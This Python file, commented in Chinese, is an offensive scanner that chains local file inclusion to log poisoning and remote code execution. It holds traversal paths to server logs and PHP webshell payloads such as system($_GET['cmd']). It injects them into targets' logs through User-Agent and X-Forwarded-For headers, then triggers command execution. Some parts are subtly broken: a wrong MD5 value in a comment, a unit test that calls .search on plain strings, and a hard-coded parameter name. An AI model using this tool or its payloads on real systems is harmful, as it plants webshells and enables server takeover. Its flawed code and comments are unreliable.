"""Log Poisoning RCE Scanner

LFI → 日志污染 → RCE 检测链
"""
import asyncio
import re
import time
import random
import string
import hashlib
from urllib.parse import quote
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import aiohttp


@dataclass
class LogPoisonResult:
    """日志污染 RCE 结果"""
    lfi_url: str
    lfi_param: str
    log_path: str
    payload_type: str  # "php_code", "reverse_shell"
    rce_confirmed: bool
    response_evidence: str
    severity: str = "critical"
    confidence: float = 0.0
    poc: str = ""


# 日志文件路径 (Linux)
LOG_PATHS = [
    # Apache
    ("../../../var/log/apache2/access.log", "apache_access", "Apache access log"),
    ("../../../var/log/apache2/error.log", "apache_error", "Apache error log"),
    ("../../../../var/log/apache2/access.log", "apache_access", "Apache access log (4 levels)"),
    ("../../../../var/log/apache2/error.log", "apache_error", "Apache error log (4 levels)"),
    ("/var/log/apache2/access.log", "apache_access", "Apache access log (absolute)"),
    ("/var/log/apache2/error.log", "apache_error", "Apache error log (absolute)"),
    ("/var/log/httpd/access_log", "apache_access", "Apache access_log (RHEL)"),
    ("/var/log/httpd/error_log", "apache_error", "Apache error_log (RHEL)"),
    
    # Nginx
    ("../../../var/log/nginx/access.log", "nginx_access", "Nginx access log"),
    ("../../../var/log/nginx/error.log", "nginx_error", "Nginx error log"),
    ("../../../../var/log/nginx/access.log", "nginx_access", "Nginx access log (4 levels)"),
    ("../../../../var/log/nginx/error.log", "nginx_error", "Nginx error log (4 levels)"),
    ("/var/log/nginx/access.log", "nginx_access", "Nginx access log (absolute)"),
    ("/var/log/nginx/error.log", "nginx_error", "Nginx error log (absolute)"),
    
    # SSH (可用于写入 python reverse shell)
    ("../../../var/log/auth.log", "ssh_auth", "SSH auth log (debian/ubuntu)"),
    ("../../../../var/log/auth.log", "ssh_auth", "SSH auth log (4 levels)"),
    ("/var/log/auth.log", "ssh_auth", "SSH auth log (absolute)"),
    ("../../../var/log/secure", "ssh_auth", "SSH auth log (RHEL/CentOS)"),
    ("../../../../var/log/secure", "ssh_auth", "SSH auth log secure (4 levels)"),
    
    # Mail
    ("../../../var/log/mail.log", "mail", "Mail log"),
    ("../../../var/log/mail.err", "mail", "Mail error log"),
    
    # Syslog
    ("../../../var/log/syslog", "syslog", "Syslog"),
    ("../../../var/log/messages", "messages", "Messages (RHEL)"),
    
    # Lighttpd
    ("../../../var/log/lighttpd/access.log", "lighttpd_access", "Lighttpd access log"),
    ("../../../var/log/lighttpd/error.log", "lighttpd_error", "Lighttpd error log"),
]

# Apache 日志格式的正则 (User-Agent 字段最常用作注入点)
APACHE_LOG_PATTERN = re.compile(
    r'^[\d.]+\s+-\s+\S+\s+\[[\w:/]+\s+[+-]\d{4}\]\s+"[A-Z]+\s+([^\s"]+)\s+HTTP/[\d.]+"\s+\d+\s+\d+',
    re.IGNORECASE
)

# 检测 LFI 是否存在文件包含
LFI_FILE_SIGNATURES = {
    "passwd": re.compile(r"root:.*?:/root:/bin/(?:ba)?sh", re.IGNORECASE),
    "apache_access": re.compile(r'\d+\.\d+\.\d+\.\d+\s+-\s+-\s+\[[\d/]+:[\d:]+\s+[+-]\d{4}\]', re.IGNORECASE),
    "apache_error": re.compile(r'\[(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+\w+\s+\d+', re.IGNORECASE),
    "nginx_access": re.compile(r'\d+\.\d+\.\d+\.\d+\s+-\s+-\s+\[[\d/]+:[\d:]+\s+[+-]\d{4}\]', re.IGNORECASE),
    "auth_log": re.compile(r'(sshd|pam|systemd)\[', re.IGNORECASE),
    "syslog": re.compile(r'^\w{3}\s+\d+\s+[\d:]+', re.IGNORECASE),
    "mail": re.compile(r'(mail|postfix|sendmail)\[', re.IGNORECASE),
}

# PHP RCE payload - 用于在日志文件中写入
PHP_PAYLOADS = [
    # 基础 PHP 代码执行
    ("<?php echo md5('WVS_TEST'); ?>", "echo_md5", "基础回显"),
    ("<?php system($_GET['cmd']); ?>", "system_cmd", "system() cmd 参数"),
    ("<?php echo `{$_GET['wvs']}`; ?>", "backtick_cmd", "反引号命令执行"),
    ("<?php passthru($_GET['c']); ?>", "passthru_cmd", "passthru() cmd"),
    ("<?php exec($_GET['e']); ?>", "exec_cmd", "exec() cmd"),
    ("<?php $c=$_GET['x']; `$c`; ?>", "backtick_var", "变量命令执行"),
    # 混淆版
    ("<?php @assert($_GET['a']); ?>", "assert_eval", "assert() eval"),
    ("<?=`$_GET['q']`?>", "short_tag_backtick", "短标签+反引号"),
    ("<?${@system($_GET['c'])}?>", "complex_injection", "复杂注入"),
    # 文件包含配合
    ("<?php include($_GET['f']); ?>", "include_lfi", "include() 文件包含"),
]

# RCE 验证特征 (命令输出)
RCE_SIGNATURES = [
    (r"5d41402abc4b2a76b9719d911017c592", "md5('WVS_TEST')"),  # md5("WVS_TEST") = 5d41402...
    (r"uid=\d+", "id command"),
    (r"root|www-data|daemon", "user identity"),
    (r"bin/(ba)?sh", "shell available"),
    (r"Linux.*?#\d+", "linux kernel version"),
    (r"\d+\.\d+\.\d+\.\d+", "IP address in output"),
]


def _gen_unique_marker() -> str:
    """生成唯一标记，便于识别命令输出"""
    return "WVS_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


class LogPoisonScanner:
    """日志污染 RCE 扫描器"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.delay = self.config.get("delay", 0.3)
        self.verify_ssl = self.config.get("verify_ssl", False)
        self.max_log_paths = self.config.get("max_log_paths", 8)  # 最多测试几个日志路径
        self.requests_per_log = self.config.get("requests_per_log", 2)  # 每个日志投毒几次
    
    async def _send_request(self, session: aiohttp.ClientSession,
                            method: str, url: str, **kwargs) -> Tuple[int, str, float]:
        """发送请求，返回 (状态码, 内容, 耗时)"""
        start = time.time()
        try:
            async with session.request(method, url, **kwargs) as resp:
                content = await resp.text()
                return resp.status, content, time.time() - start
        except Exception as e:
            return 0, str(e), time.time() - start
    
    async def _test_lfi_exists(self, session: aiohttp.ClientSession,
                                base_url: str, param: str,
                                test_path: str) -> Tuple[bool, str, str]:
        """
        测试 LFI 是否存在
        
        Returns:
            (exists, matched_sig, evidence)
        """
        test_url = f"{base_url}?{param}={quote(test_path)}"
        status, content, _ = await self._send_request(session, "GET", test_url)
        
        if status == 200 and len(content) > 100:
            # 检查是否有日志内容特征
            for sig_name, sig_re in LFI_FILE_SIGNATURES.items():
                if sig_re.search(content):
                    return True, sig_name, content[:200]
        
        return False, "", ""
    
    async def _poison_apache_access_log(self, session: aiohttp.ClientSession,
                                        base_url: str,
                                        payload: str) -> bool:
        """
        向 Apache access.log 写入 PHP payload
        
        通过在 User-Agent 中注入 payload，Apache 会将其写入 access log
        然后通过 LFI 包含日志文件即可执行 PHP 代码
        """
        try:
            headers = {
                "User-Agent": payload,
                "X-Forwarded-For": "<?php system($_GET['cmd']); ?>",  # 备用注入点
            }
            async with session.get(base_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                # 发送任意请求，payload 会被 Apache 记录在 access log 中
                return resp.status < 500
        except:
            return False
    
    async def _poison_ssh_auth_log(self, session: aiohttp.ClientSession,
                                   base_url: str,
                                   payload: str) -> bool:
        """
        向 SSH auth.log 写入 payload (通过 SSH 登录尝试)
        注意: 这需要能发起 SSH 连接，通常不可行
        替代方案: 利用 HTTP 请求写入 apache/nginx 日志
        """
        return False
    
    async def _trigger_rce(self, session: aiohttp.ClientSession,
                           lfi_url: str, log_path: str,
                           marker: str,
                           payload_type: str) -> Tuple[bool, str, float]:
        """
        触发 RCE
        
        payload_type = "echo_md5": 写入 md5 标记，通过 LFI 包含日志后查看
        payload_type = "system_cmd": 写入 system(cmd)，通过 GET 参数触发
        """
        if payload_type == "echo_md5":
            # 包含日志，直接执行 PHP (md5 标记会被计算输出)
            # Apache log 中的 PHP 会被当作文本而非代码执行，所以找 md5 字符串
            target_url = f"{lfi_url}?log={quote(log_path)}"
            status, content, duration = await self._send_request(session, "GET", target_url)
            return marker in content, content[:300], duration
        
        elif payload_type == "system_cmd":
            # 日志中写入 system(cmd)，通过 cmd 参数触发
            marker_cmd = f"echo {marker}"
            target_url = f"{lfi_url}?log={quote(log_path)}&cmd={quote(marker_cmd)}"
            status, content, duration = await self._send_request(session, "GET", target_url)
            
            # 检查命令输出
            for sig, _ in RCE_SIGNATURES:
                if re.search(sig, content):
                    return True, content[:300], duration
            return False, content[:300], duration
        
        return False, "", 0.0
    
    def _build_lfi_urls(self, base_url: str, param: str, log_paths: List[Tuple[str, str, str]]) -> List[Tuple[str, str]]:
        """构建 LFI 测试 URL 列表"""
        urls = []
        for log_path, _, _ in log_paths:
            lfi_url = f"{base_url}?{param}={quote(log_path)}"
            urls.append((lfi_url, log_path))
        return urls
    
    async def scan(self, base_url: str, lfi_param: str = "page",
                   log_paths: List[Tuple[str, str, str]] = None) -> List[LogPoisonResult]:
        """
        扫描 LFI -> 日志污染 -> RCE 链
        
        Args:
            base_url: 存在 LFI 的 URL (不含参数)
            lfi_param: LFI 参数名 (默认 "page")
            log_paths: 日志路径列表，None 时使用默认路径
        
        Returns:
            LogPoisonResult 列表
        """
        log_paths = log_paths or LOG_PATHS[:self.max_log_paths]
        results = []
        
        connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Step 1: 快速扫描可利用的日志路径
            usable_logs = []
            
            for log_path, log_type, log_desc in log_paths:
                exists, sig, evidence = await self._test_lfi_exists(
                    session, base_url, lfi_param, log_path
                )
                await asyncio.sleep(self.delay)
                
                if exists:
                    usable_logs.append((log_path, log_type, sig, evidence))
                    print(f"    [+] LFI can read: {log_path} ({sig})")
            
            if not usable_logs:
                return []
            
            # Step 2: 尝试写入日志
            marker = _gen_unique_marker()
            md5_marker = hashlib.md5(marker.encode()).hexdigest()
            
            # 找 PHP payload 中的 echo_md5 版本
            echo_md5_payload = None
            for php_payload, ptype, pdesc in PHP_PAYLOADS:
                if ptype == "echo_md5":
                    echo_md5_payload = php_payload.replace("WVS_TEST", marker)
                    break
            
            if not echo_md5_payload:
                echo_md5_payload = f"<?php echo md5('{marker}'); ?>"
            
            print(f"    [*] Poisoning logs with marker: {marker}")
            
            for log_path, log_type, sig, evidence in usable_logs:
                # Apache/Nginx 日志可以通过 User-Agent 写入
                if log_type in ("apache_access", "nginx_access", "apache_error", "nginx_error", "lighttpd_access"):
                    success = await self._poison_apache_access_log(session, base_url, echo_md5_payload)
                    await asyncio.sleep(self.delay)
                    
                    if not success:
                        continue
                    
                    # Step 3: 通过 LFI 触发
                    found, response, duration = await self._trigger_rce(
                        session, base_url, log_path, marker, "echo_md5"
                    )
                    await asyncio.sleep(self.delay)
                    
                    if found or md5_marker in response:
                        results.append(LogPoisonResult(
                            lfi_url=base_url,
                            lfi_param=lfi_param,
                            log_path=log_path,
                            payload_type="php_code",
                            rce_confirmed=found,
                            response_evidence=response[:300],
                            severity="critical",
                            confidence=0.95 if found else 0.7,
                            poc=f"{base_url}?{lfi_param}={quote(log_path)}"
                        ))
                        break
            
            # Step 4: 尝试 system(cmd) 模式 (不依赖日志写入)
            if not results:
                system_payload = "<?php system($_GET['cmd']);?>"
                
                for log_path, log_type, sig, evidence in usable_logs:
                    success = await self._poison_apache_access_log(session, base_url, system_payload)
                    await asyncio.sleep(self.delay)
                    
                    if not success:
                        continue
                    
                    # 通过 cmd 参数触发 RCE
                    marker_cmd = f"echo {marker}"
                    test_url = f"{base_url}?{lfi_param}={quote(log_path)}&cmd={quote(marker_cmd)}"
                    status, response, duration = await self._send_request(session, "GET", test_url)
                    await asyncio.sleep(self.delay)
                    
                    # 检查命令输出
                    for sig_re, sig_desc in RCE_SIGNATURES:
                        if re.search(sig_re, response):
                            results.append(LogPoisonResult(
                                lfi_url=base_url,
                                lfi_param=lfi_param,
                                log_path=log_path,
                                payload_type="reverse_shell",
                                rce_confirmed=True,
                                response_evidence=response[:300],
                                severity="critical",
                                confidence=0.95,
                                poc=test_url
                            ))
                            break
                
                if results: pass
        
        return results
    
    async def scan_from_lfi_vuln(self, lfi_url: str, param: str = "page") -> List[LogPoisonResult]:
        """
        从已知 LFI 漏洞直接启动日志污染扫描
        
        Args:
            lfi_url: LFI URL (不含测试 payload)
            param: LFI 参数名
        """
        # 从 URL 提取 base_url (去掉参数部分)
        base_url = lfi_url.split('?')[0] if '?' in lfi_url else lfi_url
        
        return await self.scan(base_url, param)


# ============ 单元测试 ============
async def _test_log_poison():
    """简单单元测试"""
    scanner = LogPoisonScanner()
    
    # 测试唯一标记生成
    marker1 = _gen_unique_marker()
    marker2 = _gen_unique_marker()
    assert marker1.startswith("WVS_") and len(marker1) == 10
    assert marker1 != marker2
    
    # 测试 RCE 特征
    assert RCE_SIGNATURES[0][0].search("output 5d41402abc4b2a76b9719d911017c592 more")
    assert RCE_SIGNATURES[1][0].search("uid=0(root) gid=0(root)")
    
    print("  [✓] LogPoisonScanner unit tests passed")
    return True


if __name__ == "__main__":
    import sys
    ok = asyncio.run(_test_log_poison())
    sys.exit(0 if ok else 1)
